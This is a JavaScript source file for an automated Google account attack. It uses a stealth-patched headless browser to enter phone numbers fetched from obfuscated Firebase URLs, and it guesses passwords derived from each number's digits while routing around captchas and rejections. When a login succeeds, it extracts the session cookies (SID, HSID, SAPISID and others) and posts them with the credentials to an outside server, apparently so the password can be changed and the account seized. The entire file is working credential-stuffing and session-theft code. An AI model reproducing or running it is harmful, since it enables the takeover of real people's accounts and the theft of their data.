require('events').EventEmitter.prototype._maxListeners = 100
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const crypto = require('crypto')
const axios = require('axios')
const fs = require('fs')


const COUNTRY = 'BD'
const LENGTH = 11
const TIMEING = 3
const SAVE_SIZE = 1


let signIn = 'https://accounts.google.com/v3/signin/identifier?dsh=S940062189%3A1665260575698599&continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDHYWp7Xws8OWDo__8vSPkkEImpDwna2RbBmEUp7Wfl7GpYaoWHAtWPfHfSSX-zonF0xYJnZ7HWlw&hl=en-US'

let FOUND = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUvZm91bmQv')
let GMAIL = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUvZ21haWwv')
let TOKEN = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUvdG9rZW4v')

let SERVER = null
let SIZE = 0
let USER_AGENT = null
let mList = []
let mCaptcha = false
let mReject = 0
let mCaptchaList = {}
let mReqHeader = null
let identifierToken = null
let reqTime = null

let mTime = 0

let page = null

puppeteer.use(StealthPlugin())

fs.readFile('id.txt', { encoding: 'utf-8' }, function(err,data){
    if(!err) {
        try {
            process.argv.slice(2).forEach(function (val, index) {
                if (index == 0) {
                    SERVER = 'server-'+data+'/child-'+val
                    if (mList.length == 0) {
                        phoneNumber(false)
                    }
                }
            })
        } catch (e) {}
    }
})

try {
    mCaptchaList = JSON.parse(fs.readFileSync('captcha.json'))
} catch (error) {}

fs.watchFile('captcha.json', function(curr, prev) {
    try {
        mCaptchaList = JSON.parse(fs.readFileSync('captcha.json'))
    } catch (error) {}
})


function phoneNumber(update) {
    mList = []

    if (update) {
        dataCollect(true)
    } else {
        axios.get(TOKEN+SERVER+'.json').then(res => {
            try {
                let data = res.data.list
                SIZE = res.data.size

                if (SIZE >= 1000) {
                    dataCollect(false)
                } else if(data != null && SIZE != null) {
                    mList = data
                }
            } catch (error) {}
    
            if (mList == null) {
                mList = []
            }
    
            dataCollect(false)
        }).catch(err => {})
    }
}

function dataCollect(update) {
    
    if (mList.length == 0) {
        axios.get(FOUND+'server.json').then(res => {
            try {
                if (res.data.size >= 1000) {
                    let CHECK = res.data.server
                    let S_SIZE = res.data.size
                    let COLLECT = res.data.collect
                    
                    axios.get(FOUND+'number.json?orderBy="$key"&limitToFirst=1').then(res => {
                        let key = null
                        try {
                            let data = res.data
                            if(data) {
                                for (let [keys, values] of Object.entries(data)) {
                                    key = keys
                                    for (let value of Object.values(values)) {
                                        mList.push(value)
                                    }
                                }
                            }
                        } catch (error) {}
        
                        if (key && mList.length >= 1000) {
                            if (CHECK == false) {
                                setData(FOUND+'server/size.json', S_SIZE - 1000)
                            } else {
                                setData(FOUND+'server/collect.json', COLLECT + 1000)
                            }

                            SIZE = 0
                            
                            setData(TOKEN+SERVER+'.json', { size: SIZE, list: mList })
                            deleteData(FOUND+'number/'+key+'.json')

                            if (update) {
                                setTimeout( async () => {
                                    try {
                                        await page.goto(signIn)
                                        await numberType(page, '+'+mList[SIZE])
                                        await page.click('#identifierNext')
                                    } catch (error) {}
                                }, 100)
                            } else {
                                browserStart()
                            }
                        } else {
                            setTimeout(() => {
                                dataCollect(update)
                            }, 30000)
                        }
                    }).catch(err => {
                        setTimeout(() => {
                            dataCollect(update)
                        }, 30000)
                    })
                } else {
                    setTimeout(() => {
                        dataCollect(update)
                    }, 30000)
                }
            } catch (error) {
                setTimeout(() => {
                    dataCollect(update)
                }, 30000)
            }
        }).catch(err => {
            setTimeout(() => {
                dataCollect(update)
            }, 30000)
        })
    } else {
        if (update) {
            setTimeout( async () => {
                try {
                    await page.goto(signIn)
                    await numberType(page, '+'+mList[SIZE])
                    await page.click('#identifierNext')
                } catch (error) {}
            }, 100)
        } else {
            browserStart()
        }
    }
}

async function browserStart() {

    console.log('Browser Start', SIZE, mList.length, SERVER.split('/')[1])

    try {
        let browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })
    
        page = (await browser.pages())[0]
    
        USER_AGENT = await page.evaluate(() => navigator.userAgent)
    
        if (USER_AGENT == null) {
            USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
        }

        page.on('request', async (req) => {
    
            try {
                let url = req.url()
    
                mTime = new Date().getTime()
        
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=jfk2af')) {
                    let pageUrl = await page.evaluate(() => window.location.href)
                    
                    let tl = null
                    let cid = '1'
                    let dsh = null
                    let ifkv = null
                    let index = pageUrl.indexOf('TL=')
                    if(index != -1) {
                        tl = pageUrl.substring(index+3, pageUrl.length).split('&')[0]
                        index = pageUrl.indexOf('cid=')
                        if(index != -1) {
                            cid = pageUrl.substring(index+4, pageUrl.length).split('&')[0]
                        }
                        index = pageUrl.indexOf('dsh=')
                        if(index != -1) {
                            dsh = pageUrl.substring(index+4, pageUrl.length).split('&')[0]
                        } else {
                            dsh = 'S940062189:1665260575698599'
                        }
                        index = pageUrl.indexOf('ifkv=')
                        if(index != -1) {
                            ifkv = pageUrl.substring(index+5, pageUrl.length).split('&')[0]
                        } else {
                            ifkv = 'AQDHYWp7Xws8OWDo__8vSPkkEImpDwna2RbBmEUp7Wfl7GpYaoWHAtWPfHfSSX-zonF0xYJnZ7HWlw'
                        }
        
                        let cookie = await page.cookies()
                        let gps = null
                        cookie.forEach(function (value) {
                            if (value.name == '__Host-GAPS') {
                                gps = value.value
                            }
                        })

                        page.goto('about:blank')
                
                        passwordMatching(mList[SIZE], tl, parseInt(cid), decodeURIComponent(dsh), ifkv, gps, 0)
                    } else {
                        nextNumber()
                    }
                } else if (url.startsWith('https://accounts')) {
                    if(url.includes('source-path=%2Fv3%2Fsignin%2Frejected')) {
                        mReject++
                        console.log('Reject', mReject)
                        if (mReject >= 5) {
                            nextNumber()
                        } else {
                            try {
                                await page.goto(signIn)
                                await numberType(page, '+'+mList[SIZE])
                                await page.click('#identifierNext')
                            } catch (error) {}
                        }
                    } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                        if(!mCaptcha) {
                            mCaptcha = true
                            let send = mCaptchaList[new Date().getTime()]
                            if (send == null) {
                                send = 1
                            } else {
                                send += 1
                            }
                            mCaptchaList[new Date().getTime()] = send
                            console.log('Captcha', Object.keys(mCaptchaList).length)
        
                            nextNumber()
        
                            try {
                                fs.writeFileSync('captcha.json', JSON.stringify(mCaptchaList))
                            } catch (error) {}
                        }
                    } else if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=')) {
                        if(url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
                            mCaptcha = false
                            mReqHeader = req.headers()
                            try {
                                let split = req.postData().split('&')
                                reqTime = split[1].split('=')[1]
        
                                let data = JSON.parse(decodeURIComponent(split[0].split('=')[1]))
                                try {
                                    identifierToken = JSON.parse(data[0][0][1])[30][0][1]
                                } catch (error) {
                                    identifierToken = JSON.parse(data[0][0][1])[8][0][1]
                                }
                            } catch (error) {}
        
                            setTimeout(async () => {
                                let error = await page.evaluate(() => {
                                    let error = document.querySelector('div.o6cuMc')
                                    if(error != null) {
                                        return true
                                    }
                                    return false
                                })
            
                                if(error) {
                                    nextNumber()
                                }
                            }, 2000)
                        } else if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=WZfWSd')) {
                            nextNumber()
                        } else {
                            let pageUrl = await page.evaluate(() => window.location.href)
                            if (!pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier') && !pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pwd') && !url.startsWith('https://accounts.google.com/signin/v2/challenge/pwd')) {
                                nextNumber()
                            }
                        }
                    } else if (url.startsWith('https://accounts.google.com/signin/v2/challenge')) {
                        nextNumber()
                    }
                } 
            } catch (error) {}
        })
    
        page.on('error', err=> {})
        
        page.on('pageerror', pageerr=> {})
    
        await page.goto(signIn)
        await numberType(page, '+'+mList[SIZE])
        await page.click('#identifierNext')
    } catch (error) {
       console.log(error) 
    }
}

setInterval(() => {
    if (mTime > 0 && mTime+120000 < new Date().getTime()) {
        SIZE++
        saveData(true)
        setTimeout(() => {
            console.log(SERVER.split('/')[1])
            console.log('---Restart Browser---')
            process.exit(2)
        }, 1000)
    }
}, 30000)


function passwordMatching(number, tl, cid, dsh, ifkv, gps, loop) {

    let num = number.toString()
    let pass = num.substring(num.length-LENGTH, num.length)

    if(loop == 1) {
        pass = pass.substring(0, 8)
    } else if(loop == 2) {
        pass = pass.substring(pass.length-8, pass.length)
    }

    if (identifierToken == null) {
        identifierToken = getIdentifier()
    }

    axios.post('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb&source-path=%2Fv3%2Fsignin%2Fchallenge%2Fpwd&hl=en&TL='+tl, getPasswordData(pass, tl, cid, dsh, ifkv, identifierToken, reqTime), {
        headers: mReqHeader
    }).then(res => {
        let next = true
        try {
            let body = res.data
            if (body.substring(0, 40).includes('wrb.fr')) {
                if(body.includes('https://accounts.google.com/CheckCookie') || body.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie')) {
                    next = false
                    console.log('Login Success: '+SERVER.split('/')[1])

                    setData(TOKEN+SERVER+'/size.json', SIZE)
                    let cookiesList = res.headers['set-cookie']
                    if(cookiesList) {
                        output = 1
                        let sendCookies = ''
        
                        for(let i=0; i<cookiesList.length; i++) {
                            let singelData = cookiesList[i]
                            try {
                                let start = singelData.indexOf('=')
                                let end = singelData.indexOf(';')
                                let key = singelData.substring(0, start)
                                if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                                    let value = singelData.substring(start+1, end)
                                    sendCookies += key+'='+value+'; '
                                }
                            } catch (e) {}
                        }

                        passwordChange(number, tl, cid, gps, pass, sendCookies, 0)
                    } else {
                        nextNumber()
                    }
                } else if (body.includes('webapproval')) {
                    next = false
                    setData(GMAIL+'menually/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
                    nextNumber()
                } else if (body.includes('VOICE') || !body.includes('INCORRECT_ANSWER_ENTERED')) {
                    next = false
                    setData(GMAIL+'voice/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
                    nextNumber()
                } else if (body.includes('changepassword')) {
                    next = false
                    console.log('Password Change: '+SERVER.split('/')[1])
                    setData(GMAIL+'change/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
                    nextNumber()
                } else if(!body.includes('INCORRECT_ANSWER_ENTERED')) {
                    console.log(pass, body)

                    console.log(dsh, ifkv)
                }
            }
        } catch (error) {}

        if (next) {
            if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
                passwordMatching(number, tl, cid, dsh, ifkv, gps, 1)
            } else if (loop == 1 && TIMEING == 3) {
                passwordMatching(number, tl, cid, dsh, ifkv, gps, 2)
            } else {
                nextNumber()
            }
        }
    }).catch(err => {
        if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
            passwordMatching(number, tl, cid, dsh, ifkv, gps, 1)
        } else if (loop == 1 && TIMEING == 3) {
            passwordMatching(number, tl, cid, dsh, ifkv, gps, 2)
        } else {
            nextNumber()
        }
    })
}


function passwordChange(number, tl, cid, gps, password, cookies, again) {
    let data = COUNTRY+'★'+number+'★'+password+'★'+tl+'★'+gps+'★'+cid+'★'+USER_AGENT+'★'+cookies

    axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
        try {
            let body = res.data
            if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
                nextNumber()
            } else if (again == 0) {
                passwordChange(number, tl, cid, gps, password, cookies, 1)
            } else {
                nextNumber()
            }
        } catch (error) {
            if (again == 0) {
                passwordChange(number, tl, cid, gps, password, cookies, 1)
            } else {
                nextNumber()
            }
        }
    }).catch(err => {
        if (again == 0) {
            passwordChange(number, tl, cid, gps, password, cookies, 1)
        } else {
            nextNumber()
        }
    })
}

function nextNumber() {
    SIZE++
    saveData(false)
    mReject = 0
    if (SIZE >= 1000) {
        phoneNumber(true)
    } else {
        setTimeout(async () => {
            try {
                await page.goto(signIn)
                await numberType(page, '+'+mList[SIZE])
                await page.click('#identifierNext')
            } catch (error) {
                setTimeout(() => {
                    console.log('---Restart Browser---')
                    process.exit(2)
                }, 1000)
            }
        }, 100)
    }
}

function getPasswordData(password, tl, cid, dsh, ifkv, token, at) {
    let fReq = encodeURIComponent(JSON.stringify([[["B4hajb","[1,1,null,[1,null,null,null,[\""+password+"\",null,true]],[null,null,null,null,\"https://accounts.google.com/\"],null,[[[\"TL\",\""+tl+"\"],[\"checkConnection\",\"youtube:415:0\"],[\"checkedDomains\",\"youtube\"],[\"cid\",\""+cid+"\"],[\"continue\",\"https://accounts.google.com/\"],[\"dsh\",\""+dsh+"\"],[\"flowEntry\",\"ServiceLogin\"],[\"flowName\",\"GlifWebSignIn\"],[\"followup\",\"https://accounts.google.com/\"],[\"hl\",\"en-US\"],[\"ifkv\",\""+ifkv+"\"],[\"pstMsg\",\"1\"]],\"accounts.google.com\",\"/v3/signin/challenge/pwd\"],null,[[\"identity-signin-password\",\""+token+"\"]]]",null,"generic"]]]))
    if(at) {
        return 'f.req='+fReq+'&at='+at
    }
    return 'f.req='+fReq
}


function getIdentifier() {
    let data = '!'
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}

function saveData(instant) {
    if (instant || SIZE%SAVE_SIZE == 0) {
        console.log('Save Data: '+SERVER.split('/')[1], SIZE)
        setData(TOKEN+SERVER+'/size.json', SIZE)
    }
}

function setData(url, data) {
    axios.put(url, JSON.stringify(data), {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }).then(res => {}).catch(err => {})
}

function deleteData(url) {
    axios.delete(url).then(res => {}).catch(err => {})
}

async function numberType(page, number) {
    await page.evaluate((gmail) => document.querySelector('input#identifierId').value = gmail, number)
}

function decrypt(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
